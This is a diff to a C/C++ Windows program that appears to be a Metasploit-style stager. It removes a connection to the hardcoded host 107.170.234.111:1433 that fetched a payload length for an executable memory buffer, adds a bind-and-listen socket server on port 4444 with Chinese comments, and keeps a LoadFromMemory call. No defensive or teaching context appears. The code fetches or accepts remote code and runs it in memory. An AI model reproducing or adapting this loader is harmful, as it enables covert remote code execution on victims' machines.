@@ -175,7 +175,7 @@ void punt(SOCKET my_socket, char * error) {
 /* establish a connection to a host:port */
 SOCKET wsconnect(char * targetip, int port) {
 	struct hostent *		target;
-	struct sockaddr_in 	sock;
+/*	struct sockaddr_in 	sock;*/
 	SOCKET 			my_socket;
 
 	/* setup our socket */
@@ -184,21 +184,69 @@ SOCKET wsconnect(char * targetip, int port) {
 		punt(my_socket, "Could not initialize socket");
 
 	/* resolve our target */
-	target = gethostbyname(targetip);
+	/*target = gethostbyname(targetip);
 	if (target == NULL)
 		punt(my_socket, "Could not resolve target");
-
+		*/
 
 	/* copy our target information into the sock */
-	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
-	sock.sin_family = AF_INET;
-	sock.sin_port = htons(port);
+	//memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
+// 	sock.sin_addr.S_un.S_addr = inet_addr(targetip);
+// 	sock.sin_family = AF_INET;
+// 	sock.sin_port = htons(port);
 
-	/* attempt to connect */
+	/* attempt to connect
 	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
 		punt(my_socket, "Could not connect to target");
+	*/
 
-	return my_socket;
+	// 填充sockaddr_in结构
+	sockaddr_in sin;
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(port);
+	sin.sin_addr.S_un.S_addr = INADDR_ANY;
+
+	// 绑定这个套节字到一个本地地址
+	if (::bind(my_socket, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
+	{
+		printf("Failed bind() \n");
+		return 0;
+	}
+
+	// 进入监听模式
+	if (::listen(my_socket, 2) == SOCKET_ERROR)
+	{
+		printf("Failed listen() \n");
+		return 0;
+	}
+
+	// 循环接受客户的连接请求
+	sockaddr_in remoteAddr;
+	int nAddrLen = sizeof(remoteAddr);
+	SOCKET sClient;
+	char szText[] = " TCP Server Demo! \r\n";
+// 	while (TRUE)
+// 	{
+		// 接受一个新连接
+		sClient = ::accept(my_socket, (SOCKADDR*)&remoteAddr, &nAddrLen);
+		if (sClient == INVALID_SOCKET)
+		{
+			printf("Failed accept()");
+			/*continue;*/
+		}
+
+// 		printf(" 接受到一个连接：%s \r\n", inet_ntoa(remoteAddr.sin_addr));
+// 
+// 		// 向客户端发送数据
+// 		::send(sClient, szText, strlen(szText), 0);
+// 		// 关闭同客户端的连接
+// 		::closesocket(sClient);
+	//}
+
+	// 关闭监听套节字
+	/*::closesocket(sListen);*/
+
+	return sClient;
 }
 
 /* attempt to receive all of the requested data from the socket */
@@ -226,11 +274,11 @@ int main(int argc, char* argv[])
 	winsock_init();
 
 	/* connect to the handler */
-	 my_socket = wsconnect("107.170.234.111", atoi("1433"));
+	 my_socket = wsconnect("0.0.0.0", atoi("4444"));
 	 	
-	int count = recv(my_socket, (char *)&size, 4, 0);
-	if (count != 4 || size <= 0)
-		punt(my_socket, "read a strange or incomplete length value\n");
+// 	int count = recv(my_socket, (char *)&size, 4, 0);
+// 	if (count != 4 || size <= 0)
+// 		punt(my_socket, "read a strange or incomplete length value\n");
 
 	/* allocate a RWX buffer */
 	//buffer = (char *)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -250,6 +298,7 @@ int main(int argc, char* argv[])
 
 	//
 	//LoadFromFile();
+
 	printf("\n\n");
 	LoadFromMemory();//192.168.211.176
 	return 0;
